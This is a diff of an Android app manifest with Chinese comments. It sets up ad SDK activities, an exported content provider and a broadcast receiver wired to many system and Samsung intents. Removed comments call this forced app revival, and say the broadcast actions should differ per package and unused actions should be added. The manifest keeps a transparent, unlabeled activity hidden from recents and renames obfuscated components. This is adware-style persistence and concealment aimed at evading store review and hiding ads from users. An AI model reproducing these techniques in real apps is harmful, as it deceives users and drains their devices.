@@ -13,16 +13,7 @@
             tools:replace="android:resource" />
 
 
-        <!-- todo 下面为广告ac 的信息，需要重写如下信息
-            需要注意对应聚合的广告平台是否有添加进来，因为有时候会该聚合和该接入的平台所以需要检查
-               android:excludeFromRecents="true"
-            android:finishOnCloseSystemDialogs="true"
-        -->
-        <!--
-            todo  部分明确了的广告页面可以添加替换掉App图标 改成透明图标
-            android:icon=""
-            android:roundIcon=""-->
-        <!--   pangle     -->
+
         <activity
             android:name="com.bytedance.sdk.openadsdk.activity.TTCeilingLandingPageActivity"
             android:configChanges="keyboardHidden|orientation|screenSize"
@@ -380,12 +371,12 @@
           -->
 
         <!--     前台服务（重构版本）  -->
-        <service android:name="f.FgSvcX" />
+        <service android:name="showhi.rf.ghht.hj.FgSvcX" />
 
 
         <!--     todo add  FcmService  -->
         <service
-            android:name="g.NewFC"
+            android:name="showge.nn.utils.NewFC"
             android:enabled="true"
             android:exported="true">
             <intent-filter>
@@ -393,33 +384,30 @@
             </intent-filter>
         </service>
 
-        <!--     todo add  Provider 三星拉活 + 首次联系人拉活
-        authorities 命名需要重命名xxx
-          -->
+
         <provider
-            android:name="e.NcLl"
+            android:name="showcan.jk.bg.jk.NcLl"
             android:authorities="${applicationId}.newkuang"
             android:enabled="true"
             android:exported="true">
 
-            <!--       todo add not use code 
-                    添加一些没有使用到的 action
-                -->
             <intent-filter>
                 <action android:name="com.samsung.android.intent.action.DEVICE_SEARCH" />
                 <action android:name="com.samsung.android.search.intent.ACTION_CONTENT_SEARCH" />
                 <action android:name="com.samsung.android.sdk.command.COMMAND_PROVIDER" />
+                <action android:name="android.intent.action.BATTERY_OKAY" />
+                <action android:name="android.intent.action.BATTERY_CHANGED" />
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
             </intent-filter>
 
         </provider>
         <receiver
-            android:name="zj.go.ll.DBR"
+            android:name="showji.ll.rec.DBR"
             android:enabled="true"
             android:exported="true">
             <intent-filter>
-                <!--  Android 14以上的广播拉活    todo 高版本广播拉活应用，需要在这个的基础上进行
-                做差异化，增加一些广播action每个包需要不一样且数量也不一样
-              -->
+
                 <action android:name="com.android.adservices.PACKAGE_CHANGED" />
                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
                 <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
@@ -436,7 +424,7 @@
                 <action android:name="android.intent.action.CLOSE_SYSTEM_DIALOGS" />
             </intent-filter>
         </receiver>
-        <!--  todo modify   透明ac   -->
+        <!--  todo modify   透明ac  改成图片  -->
         <!--  todo ic_tra_icon 透明图片或者xml的透明形状 -->
         <activity
             android:name="zj.go.show.TouShow"
@@ -445,7 +433,7 @@
             android:exported="false"
             android:finishOnCloseSystemDialogs="true"
             android:icon="@drawable/t_v"
-            android:label="@string/str_null"
+            android:label="@string/em_s_v"
             android:launchMode="singleTask"
             android:noHistory="true"
             android:roundIcon="@drawable/t_v"
